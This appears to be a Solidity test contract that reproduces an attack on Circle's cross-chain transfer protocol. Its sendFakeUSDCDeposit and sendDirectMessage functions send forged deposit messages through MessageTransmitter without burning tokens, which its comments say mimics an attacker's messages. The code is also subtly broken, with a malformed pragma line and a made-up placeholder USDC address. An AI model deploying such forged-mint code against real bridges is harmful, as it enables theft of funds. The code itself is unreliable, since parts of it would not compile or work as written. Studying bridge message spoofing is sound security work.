// SPDX-License-Identifier: MIT
pragma solidity .8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IMessageTransmitter {
    function sendMessage(
        uint32 destinationDomain,
        bytes32 recipient,
        bytes calldata messageBody
    ) external returns (uint64 nonce);
}

interface ITokenMessenger {
    function depositForBurn(
        uint256 amount,
        uint32 destinationDomain,
        bytes32 mintRecipient,
        address burnToken
    ) external returns (uint64 nonce);
}

contract CCTPMessageTest is Ownable {
    // MessageTransmitterV2 Address (same across all EVM chains)
    IMessageTransmitter public constant messageTransmitter = 
        IMessageTransmitter(0x0eb340E74b09c2CE87AFCD8b8C156f081432f5c1);
    
    // TokenMessengerV2 Address (same across all EVM chains)
    ITokenMessenger public constant tokenMessenger = 
        ITokenMessenger(0x12b7546E3A678bd317f25979C6F676Be1b759604);
    
    // USDC Address (example on Ethereum mainnet)
    address public constant usdc = 0xA0b86a33E6441e8c8C8c8c8c8c8c8c8c8c8c8c8;
    
    event MessageSent(uint64 nonce, bytes message);
    
    constructor() {}
    
    // Function to send a message directly through MessageTransmitter
    // This bypasses TokenMessenger.depositForBurn() entirely
    function sendDirectMessage(
        uint32 destinationDomain,
        bytes32 recipientAddress,
        bytes calldata arbitraryMessage
    ) external onlyOwner returns (uint64 nonce) {
        // Call MessageTransmitter directly with arbitrary message content
        nonce = messageTransmitter.sendMessage(
            destinationDomain,
            recipientAddress,
            arbitraryMessage
        );
        
        emit MessageSent(nonce, arbitraryMessage);
        return nonce;
    }
    
    // Function to create a fake USDC deposit message
    // This mimics what the attacker would have sent
    function sendFakeUSDCDeposit(
        uint32 destinationDomain,
        bytes32 recipientAddress,
        uint256 fakeAmount
    ) external onlyOwner returns (uint64 nonce) {
        // Create a message body that looks like a USDC deposit
        // but without actually burning any tokens
        bytes memory fakeDepositMessage = abi.encode(
            usdc,                // token address
            fakeAmount,          // amount (fake)
            recipientAddress     // mint recipient
        );
        
        // Send directly through MessageTransmitter
        nonce = messageTransmitter.sendMessage(
            destinationDomain,
            recipientAddress,
            fakeDepositMessage
        );
        
        emit MessageSent(nonce, fakeDepositMessage);
        return nonce;
    }
    
    // Function to demonstrate the normal flow through TokenMessenger
    function sendNormalDeposit(
        uint256 amount,
        uint32 destinationDomain,
        bytes32 mintRecipient
    ) external onlyOwner returns (uint64 nonce) {
        // This requires you to actually have USDC tokens to burn
        nonce = tokenMessenger.depositForBurn(
            amount,
            destinationDomain,
            mintRecipient,
            usdc
        );
        
        emit MessageSent(nonce, abi.encode(usdc, amount, mintRecipient));
        return nonce;
    }
}
